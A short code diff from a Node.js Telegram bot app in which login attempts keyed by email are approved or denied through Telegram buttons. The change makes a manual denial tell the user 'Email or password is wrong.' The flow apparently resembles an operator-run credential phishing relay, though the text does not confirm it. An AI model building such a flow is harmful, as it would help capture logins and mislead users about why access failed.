@@ -36,7 +36,7 @@ bot.on('callback_query', async (query) => {
     }
 
     if (data.startsWith('deny:')) {
-      loginDecisions.set(email, { status: 'denied', message: 'Login rejected. Please check your credentials and try again.' });
+      loginDecisions.set(email, { status: 'denied', message: 'Email or password is wrong.' });
       await bot.answerCallbackQuery(query.id, { text: 'Denied' });
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
@@ -110,7 +110,7 @@ app.post('/api/telegram', async (req, res) => {
     }
 
     if (data.startsWith('deny:')) {
-      loginDecisions.set(email, { status: 'denied', message: 'Login rejected. Please check your credentials and try again.' });
+      loginDecisions.set(email, { status: 'denied', message: 'Email or password is wrong.' });
       await bot.answerCallbackQuery(query.id, { text: 'Denied' });
       await bot.editMessageReplyMarkup(
         { inline_keyboard: [] },
